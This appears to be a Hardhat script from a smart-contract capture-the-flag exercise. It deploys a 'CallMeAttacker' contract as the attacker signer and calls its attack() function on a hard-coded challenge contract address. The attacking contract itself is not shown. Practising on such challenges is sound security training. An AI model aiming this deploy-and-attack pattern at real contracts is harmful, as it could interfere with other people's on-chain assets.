const { ethers } = require("hardhat");
const hre = require("hardhat");

const CHALLENGE_CONTRACT_ADDRESS = "0x221b201E921Af1D5Ef3347ffE31f47791428cBf7";

async function main() {
  const [attacker] = await hre.ethers.getSigners();
  const callMeAttacker = await (await ethers.getContractFactory("CallMeAttacker", attacker)).deploy();

  await callMeAttacker.attack(CHALLENGE_CONTRACT_ADDRESS);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
